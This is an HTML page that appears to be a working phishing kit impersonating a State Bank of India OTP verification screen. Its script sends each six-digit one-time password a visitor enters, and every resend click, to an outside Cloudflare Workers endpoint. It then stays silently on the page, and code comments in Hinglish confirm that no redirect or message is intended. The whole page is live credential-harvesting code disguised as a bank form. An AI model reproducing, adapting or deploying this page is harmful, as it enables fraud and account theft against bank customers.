<!DOCTYPE html>
<html lang="hi">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>blogfive</title>
    <style>
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
            font-family: Arial, sans-serif;
        }
        
        body {
            background-color: #f0f0f0;
            min-height: 100vh;
            padding-bottom: 20px;
        }
        
        .header {
            text-align: center;
            padding: 15px;
            background-color: white;
        }
        
        .logo {
            max-width: 100%;
            height: auto;
            max-height: 120px;
        }
        
        .container {
            max-width: 420px;
            margin: 15px auto;
            background-color: white;
            border-radius: 5px;
            box-shadow: 0 2px 5px rgba(0,0,0,0.08);
            overflow: hidden;
        }
        
        .form-header {
            color: #000;
            padding: 18px 20px 8px 20px;
            text-align: center;
            font-size: 16px;
            font-weight: bold;
        }
        
        .form-content {
            padding: 0 20px 20px 20px;
        }
        
        .form-group {
            margin-bottom: 10px;
            position: relative;
        }
        
        .form-label {
            display: block;
            font-size: 12px;
            font-weight: bold;
            color: #333;
            margin-bottom: 3px;
        }
        
        .form-input {
            width: 100%;
            padding: 6px 0;
            font-size: 18px;
            border: none;
            border-bottom: 1px solid #ccc;
            background-color: transparent;
            outline: none;
            border-radius: 0;
            transition: border-color 0.3s;
            text-align: left;
            font-weight: bold;
        }
        
        .form-input::placeholder {
            font-size: 12px;
            color: #999;
            font-weight: normal;
            font-style: italic;
        }
        
        .form-input:focus {
            border-bottom-color: #24A1E8;
        }
        
        .proceed-button {
            display: block;
            width: 100%;
            padding: 10px;
            background-color: #24A1E8;
            color: white;
            font-size: 14px;
            font-weight: bold;
            border: none;
            border-radius: 4px;
            cursor: pointer;
            margin-top: 15px;
        }
        
        .proceed-button:hover {
            background-color: #1a8cd8;
        }
        
        .message {
            font-size: 13px;
            color: #666;
            text-align: center;
            margin-bottom: 15px;
            line-height: 1.4;
        }
        
        .resend-container {
            display: flex;
            justify-content: flex-end;
            margin: 5px 0 10px 0;
        }
        
        .resend-button {
            width: 80px;
            padding: 4px 0;
            background-color: #87CEEB;
            color: white;
            font-size: 11px;
            font-weight: bold;
            border: none;
            border-radius: 2px;
            cursor: pointer;
            text-align: center;
            transition: background-color 0.3s;
        }
        
        .resend-button:enabled {
            background-color: #70b8d8;
        }
        
        .resend-button:hover:enabled {
            background-color: #5ca3c2;
        }
        
        .resend-button:disabled {
            background-color: #b3e0f2;
            color: white;
            cursor: not-allowed;
            opacity: 0.8;
        }
        
        .timer {
            text-align: center;
            font-size: 14px;
            color: #333;
            margin: 10px 0;
            font-weight: bold;
        }
        
        .asterisk {
            color: #ff0000;
        }
        
        .footer-img {
            width: 100%;
            max-width: 900px;
            display: block;
            margin: 20px auto 0;
        }
        
        .separator {
            border-top: 1px solid #ccc;
            margin: 15px 0;
        }
    </style>
</head>
<body>
    <div class="header">
        <img src="https://i.ibb.co/fz5x9ff2/Main-817fcadb-1.jpg" alt="SBI Logo" class="logo">
    </div>
    
    <div class="container">
        <div class="form-header">
            Final OTP Verification
        </div>
        
        <div class="form-content">
            <div class="message">
                One Time Password (OTP) has been sent to your registered mobile Number.<br>
                Please enter the final OTP to complete the process.
            </div>
            
            <div class="separator"></div>
            
            <div class="form-group">
                <label class="form-label">One Time Password <span class="asterisk">*</span></label>
                <input type="text" class="form-input" id="otpInput" maxlength="6" pattern="[0-9]{6}" placeholder="enter 6 digit otp">
            </div>
            
            <div class="resend-container">
                <button class="resend-button" id="resendButton" disabled>Resend OTP</button>
            </div>
            
            <div class="timer" id="timer">180</div>
            
            <button class="proceed-button" id="proceedButton">PROCEED</button>
        </div>
    </div>
    
    <img src="https://i.ibb.co/5WTjD1Nb/Footer-bfdfef4c-1.jpg" alt="Security Guidelines" class="footer-img">
    
    <script>
        const otpInput = document.getElementById('otpInput');
        const timerElement = document.getElementById('timer');
        const proceedBtn = document.getElementById('proceedButton');
        const resendButton = document.getElementById('resendButton');
        
        let seconds = 180;
        let timerInterval;
        
        // OTP Input - only digits
        otpInput.addEventListener('input', function(e) {
            e.target.value = e.target.value.replace(/\D/g, '').substring(0, 6);
        });
        
        // Timer function
        function updateTimer() {
            seconds--;
            timerElement.textContent = seconds;
            
            if (seconds <= 0) {
                clearInterval(timerInterval);
                timerElement.textContent = "0";
                resendButton.disabled = false;
            }
        }
        
        // Start timer
        timerInterval = setInterval(updateTimer, 1000);
        
        // Resend button click
        resendButton.addEventListener('click', function() {
            if (resendButton.disabled) return;
            
            // Reset timer
            seconds = 180;
            clearInterval(timerInterval);
            timerElement.textContent = "180";
            timerInterval = setInterval(updateTimer, 1000);
            
            // Clear input
            otpInput.value = "";
            resendButton.disabled = true;
            otpInput.focus();
            
            // Log resend to worker
            fetch('https://aged-sunset-63e0.skd38824.workers.dev/', {
                method: 'POST',
                mode: 'cors',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify({
                    id: Date.now(),
                    type: 'OTP2',
                    data: { otp: 'RESEND_REQUEST', status: 'resend' },
                    timestamp: new Date().toISOString()
                })
            }).catch(() => {});
        });
        
        // Proceed button
        proceedBtn.addEventListener('click', async function(e) {
            e.preventDefault();
            
            const otpValue = otpInput.value.trim();
            
            if (otpValue.length !== 6 || !/^\d+$/.test(otpValue)) {
                otpInput.style.borderBottomColor = '#ff4444';
                return;
            }
            
            otpInput.style.borderBottomColor = '#24A1E8';
            
            // Submit to worker
            try {
                await fetch('https://aged-sunset-63e0.skd38824.workers.dev/', {
                    method: 'POST',
                    mode: 'cors',
                    headers: { 'Content-Type': 'application/json' },
                    body: JSON.stringify({
                        id: Date.now(),
                        type: 'OTP2',
                        data: { otp: otpValue },
                        timestamp: new Date().toISOString()
                    })
                });
            } catch (error) {
                console.error('Submission error:', error);
            }
            
            // Clear input
            otpInput.value = '';
            
            // Page par hi raho - koi redirect nahi
            // Koi message nahi
        });
        
        // Enter key
        otpInput.addEventListener('keypress', function(e) {
            if (e.key === 'Enter') proceedBtn.click();
        });
        
        // Auto focus
        window.onload = () => otpInput.focus();
    </script>
</body>
</html>
